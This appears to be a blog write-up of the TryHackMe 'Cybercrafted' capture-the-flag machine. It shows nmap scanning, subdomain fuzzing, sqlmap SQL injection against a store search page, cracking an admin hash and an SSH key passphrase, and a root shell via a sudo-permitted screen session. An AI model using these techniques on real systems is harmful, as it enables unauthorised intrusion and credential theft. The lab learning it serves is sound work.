---
title: Cybercrafted
date: 2021-11-24 11:11:11 +/-TTTT
categories: [CTF, tryhackme]
tags: [dns, sqli, hash, sudo, minecraft]
---

|Machine Name | Date | Level | Type |
|-------------|-------|------|------|
| Cybercrafted | 2021-11-24 | Medium | ctf |

![infocard](https://tryhackme-images.s3.amazonaws.com/room-icons/dd06737472c79a806e2049ddeb3af354.png)

Pwn this pay-to-win Minecraft server!

## Reconnaissance

As always start with the Nmap.

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-21 23:54 EST
Nmap scan report for cybercrafted.thm (10.10.61.207)
Host is up (0.17s latency).

PORT      STATE SERVICE   VERSION
22/tcp    open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:36:ce:b9:ac:72:8a:d7:a6:b7:8e:45:d0:ce:3c:00 (RSA)
|   256 e9:e7:33:8a:77:28:2c:d4:8c:6d:8a:2c:e7:88:95:30 (ECDSA)
|_  256 76:a2:b1:cf:1b:3d:ce:6c:60:f5:63:24:3e:ef:70:d8 (ED25519)
80/tcp    open  http      Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Cybercrafted
25565/tcp open  minecraft Minecraft 1.7.2 (Protocol: 127, Message: ck00r lcCyberCraftedr ck00rrck00r e-TryHackMe-r  ck00r, Users: 0/1)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.57 seconds


```

here we get the HTTP server and ssh service.


### HTTP

Let's Enumerate the HTTP first.

When we browse the IP address into a browser it redirects us to `http://cybercrafted.thm/`. Add it to `/etc/hosts` file.

`index.html` serves a static image.

![index](/assets/thm/cybercrafted/index_page.png)

Review source code we get an HTML comment.

```html
<!-- A Note to the developers: Just finished up adding other subdomains, now you can work on them! -->

```

We need to find a subdomain for the machine. Lets bruteforce for subdomains.

`    ffuf -w /usr/share/wordlist/dirb/common.md -u http://cybercrafted.thm/ -H “Host: FUZZ.cybercrafted.thm”`

by brute-forcing, we get three subdomains.

1. www
2. store
3. admin

add subdomain in `/etc/hosts` file.

/admin looks interesting.

![admin log in page](/assets/thm/cybercrafted/admin_login.png)

Try some SQL injection bypass techniques but failed.

/store is a Forbidden resource. but when we do directory fuzzing on store.cybercrafted.thm we get `/search.php`

`search.php` searches items from the database so it might be vulnerable to SQL injection. Let's test using `sqlmap`.

Capture the `search.php` request in burp and save it to `sqltest.txt`

```
POST /search.php HTTP/1.1
Host: store.cybercrafted.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
Origin: http://store.cybercrafted.thm
Connection: close
Referer: http://store.cybercrafted.thm/search.php
Upgrade-Insecure-Requests: 1

search=testing&submit=

```

`sqlmap -r sqltest --batch --dbs`

/search.php is vulnerable to SQL injection.


```
available databases [5]:                                                                                              
[*] information_schema                                     
[*] mysql                                                  
[*]performance_schema                                                    [*] sys                                                                                                               
[*] webapp   

```
Enumerate the database found user and hash.

xXUltimateCreeperXx: 88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01

after cracking the hash got password: `di*************9`


user `xXUltimateCreeperXx:di*************9` Login into `admin.cybercrafted.thm`

After login, we got `/panel.php` on which we can run system commands.

From here we can get a shell by various ways.

## Gaining Access

Mostly I prefer ssh shell because it's the stable one.

from `panel.php` get xXUltimateCreeperXx user's private ssh key.

![key](/assets/thm/cybercrafted/key.png)

A private key is encrypted. Let's crack it using `ssh2john` and `john`

`ssh2john id_rsa > hash`

`john hash --wordlist=/usr/share/wordlist/rockyou.txt`

john crack the password successfully: `c*********6`

Login as `xxultimatecreeperxx`

## Privilege Escalation

### Escalate from xxultimatecreeperxx to cybercrafted

After downloading `linpeas.sh` to the target machine and enumerating it for some time I find Minecraft server on the machine. 

this Minecraft server has a plugin called `loginsystem` which has a log file called `log.txt`. 

`/opt/mincraft/cybercrafted/plugins/LoginSystem/log.txt`

From this file, we get the password for `cybercrafted` user.


`cybercrafted:J*****************k`

Log in as `cybercrafted`.

Now we have a password for `cybercrafted`.

### Escalate from cybercrafted to root

Did some enumeration on the box and found out that `cybercrafted` can run `/usr/bin/screen` as root.

```
Matching Defaults entries for cybercrafted on cybercrafted:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cybercrafted may run the following commands on cybercrafted:
    (root) /usr/bin/screen -r cybercrafted


```
`screen` is used to start a screen session or open any number of the window inside a session. 

`/usr/bin/screen -r cybercrafted` here `-r` used to resume the screen session of user `cybercrafted`.

After some research, I found out that we can create a new window with a shell using `screen`.

`sudo -u /usr/bin/screen -r cybercrafted`

it attaches the screen of `cybercrafted` .
then use shortcut `ctrl+a+c` and we get a root shell.

`ctrl+a+c` is used to create a new window with shell. and this program is running as root we get root window shell.

![root](/assets/thm/cybercrafted/root.png)


## Resources

[How To Use Linux Screen](https://linuxize.com/post/how-to-use-linux-screen/)